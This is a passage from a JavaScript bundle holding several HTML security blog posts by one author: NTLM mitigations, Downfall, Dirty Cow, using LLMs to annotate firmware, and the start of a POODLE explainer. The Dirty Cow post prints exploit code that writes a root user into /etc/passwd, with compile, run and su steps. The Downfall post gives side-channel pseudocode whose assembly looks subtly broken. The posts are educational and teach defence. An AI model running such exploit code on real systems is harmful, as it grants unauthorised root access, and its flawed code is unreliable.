          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Om=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Dm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,zm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,Fm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
